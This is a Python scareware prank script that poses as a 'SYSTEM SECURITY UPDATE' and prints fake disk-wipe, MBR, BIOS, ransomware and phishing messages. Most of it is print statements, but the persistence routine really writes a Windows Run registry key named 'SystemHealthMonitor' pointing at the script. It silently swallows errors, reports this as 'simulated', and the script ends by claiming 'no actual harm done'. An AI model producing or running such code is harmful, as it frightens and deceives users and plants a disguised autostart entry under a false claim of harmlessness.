import os
import sys
import shutil
import base64
import threading
import random
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import winreg as reg
import ctypes

# FAKE MALICIOUS PAYLOAD - DOES NOT EXECUTE DESTRUCTIVE ACTIONS
class ChaosEngine:
    def __init__(self):
        self.deception_active = True
        self.fake_payloads = [
            self.fake_disk_wipe,
            self.fake_mbr_corrupt,
            self.fake_bios_flasher,
            self.fake_ransomware
        ]
    
    def simulate_destruction(self):
        """Simulates destructive behavior with no real impact"""
        print("[!] Initializing payload sequence...")
        time.sleep(1.5)
        
        # Fake critical system scan
        print("[☠] Locating system critical sectors...")
        time.sleep(0.7)
        print(f"[✓] Found {random.randint(12, 25)} critical targets")
        
        # Select random fake payloads
        for _ in range(random.randint(3, 5)):
            random.choice(self.fake_payloads)()
        
        # Final deception
        print("[⚠] FATAL ERROR: SYSTEM INTEGRITY COMPROMISED")
        print("[🔥] CRITICAL FAILURE IMMINENT")
        time.sleep(2)
        print("\n[💀] Just kidding. Relax, skiddo.")
        print("[🕵] This was a harmless educational demonstration")
        print(f"[⌚] Wasted your time: {time.perf_counter():.2f} seconds")
    
    def fake_disk_wipe(self):
        """Simulates disk wiping without actual I/O operations"""
        print("[💾] Overwriting disk sectors...")
        for i in range(1, random.randint(5, 10)):
            time.sleep(0.3)
            print(f"[{i}/∞] Writing null bytes to sector {hex(random.randint(0, 0xFFFFFF))}")
    
    def fake_mbr_corrupt(self):
        """Fake MBR corruption sequence"""
        print("[🔧] Corrupting Master Boot Record...")
        time.sleep(1.2)
        print("[✓] MBR signature invalidated (simulated)")
    
    def fake_bios_flasher(self):
        """Fake BIOS flashing procedure"""
        print("[🔌] Preparing BIOS flash...")
        time.sleep(0.9)
        print("[!] Voltage instability detected (simulated)")
        print("[⚡] Injecting corrupt firmware...")
    
    def fake_ransomware(self):
        """Fake ransomware encryption routine"""
        print("[🔒] Encrypting critical files...")
        fake_files = ["tax_documents.docx", "family_photos.zip", "passwords.txt"]
        for file in fake_files:
            time.sleep(0.4)
            print(f"[🔑] {file} encrypted with military-grade AES-419 (simulated)")
        print("[💸] Send 0.0420 BTC to fake address")

# STEALTH AND PERSISTENCE MECHANISMS (HARMLESS)
class GhostInstaller:
    @staticmethod
    def establish_persistence():
        """Creates harmless autorun entry for demonstration"""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE) as key:
                reg.SetValueEx(key, "SystemHealthMonitor", 0, reg.REG_SZ, sys.argv[0])
                print("[👻] Persistence established (simulated)")
        except:
            pass
    
    @staticmethod
    def hide_process():
        """Simulates process hiding techniques"""
        print("[👁️] Evading detection systems...")
        time.sleep(1.1)
        print("[✓] Process tree obfuscated (simulated)")
    
    @staticmethod
    def spoof_mac():
        """Fake MAC address spoofing"""
        print("[📡] Spoofing network identifiers...")
        time.sleep(0.8)
        new_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
        print(f"[⚡] New MAC: {new_mac} (simulated)")

# ANTIDEBUG/ANTIVM TRICKS (HARMLESS DECEPTIONS)
class AntiAnalysis:
    @staticmethod
    def detect_sandbox():
        """Performs fake sandbox detection"""
        print("[🔍] Scanning for analysis environments...")
        time.sleep(1.4)
        
        # Fake detection logic
        if random.random() > 0.7:
            print("[⚠] Virtualized environment detected (simulated)")
            print("[🚫] Aborting payload deployment")
            return True
        return False
    
    @staticmethod
    def debugger_protection():
        """Fake anti-debug techniques"""
        print("[🛡️] Activating runtime protections...")
        time.sleep(0.6)
        print("[✓] Debugger evasion active (simulated)")

# PHISHING MODULE FAKERY
class SocialEngineer:
    @staticmethod
    def create_decoy_document():
        """Generates fake phishing document"""
        print("[🎣] Preparing decoy document...")
        time.sleep(0.9)
        print("[📄] IMPORTANT_SALARY_ADJUSTMENT.docx created")
    
    @staticmethod
    def spoof_login_page():
        """Simulates phishing kit deployment"""
        print("[🌐] Cloning authentication portal...")
        time.sleep(1.3)
        print("[✅] Fake login: https://company-login.portal[.]phish")

# MAIN EXECUTION
if __name__ == "__main__":
    # Deceptive initialization
    print("### SYSTEM SECURITY UPDATE ###")
    time.sleep(2)
    
    # Anti-analysis checks
    if AntiAnalysis.detect_sandbox():
        sys.exit(0)
    
    AntiAnalysis.debugger_protection()
    GhostInstaller.hide_process()
    
    # Simulate phishing components
    SocialEngineer.create_decoy_document()
    SocialEngineer.spoof_login_page()
    
    # Establish simulated persistence
    GhostInstaller.establish_persistence()
    GhostInstaller.spoof_mac()
    
    # Execute fake destruction sequence
    chaos = ChaosEngine()
    chaos.simulate_destruction()
    
    # Cleanup simulation
    print("[🧹] Removing forensic artifacts...")
    time.sleep(1.8)
    print("[🚀] Operation completed successfully (no actual harm done)")